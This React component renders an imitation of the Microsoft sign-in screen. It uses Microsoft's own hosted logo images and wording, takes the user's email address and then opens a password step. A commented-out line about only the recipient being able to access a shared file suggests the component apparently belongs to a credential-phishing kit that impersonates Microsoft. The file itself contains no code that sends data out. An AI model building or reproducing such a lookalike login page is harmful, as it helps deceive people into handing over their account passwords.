import { useState } from "react";
import "../MainSection.css";
const EmailModal = ({
  data,
  setData,
  showPasswordModal,
  setShowPasswordModal,
}) => {
  const [showErrorEmail, setShowErrorEmail] = useState(false);
  const validateEmail = (email) => {
    return String(email)
      .toLowerCase()
      .match(
        /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
      );
  };

  const updateEmail = (e) => {
    e.preventDefault();
    if (data?.email && validateEmail(data.email)) {
      setShowErrorEmail(false);
      setShowPasswordModal(true);
    } else {
      setShowErrorEmail(true);
      setShowPasswordModal(false);
    }
  };
  return (
    <>
      <div className="sign-in-container">
        <img
          src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"
          alt=""
          className="img-fluid"
        ></img>
        <p className="signIn-text">Sign In</p>
        {/* <p className="recipient">
          Only recipient email address can access shared file
        </p> */}
        {showErrorEmail && (
          <p className="recipient" style={{ color: "red" }}>
            Invalid Email Address
          </p>
        )}
        <input
          placeholder="Email address"
          name="email"
          type="email"
          className="input-field"
          onChange={(e) => setData({ ...data, email: e.target.value })}
          required
        />
        <p className="no-account">
          No account? <span className="no-link">Create one!</span>
        </p>
        <p className="no-link">Sign in with Windows Hello or a security key?</p>

        <button
          type="submit"
          className="signIn-btn"
          onClick={(e) => updateEmail(e)}
        >
          Next
        </button>
      </div>
      <div className="sign-in-down">
        <div className="sign-in-down-items">
          <img
            src="https://logincdn.msftauth.net/shared/1.0/content/images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg"
            alt=""
          ></img>
          <span>Sign-in options</span>
        </div>
      </div>
    </>
  );
};

export default EmailModal;
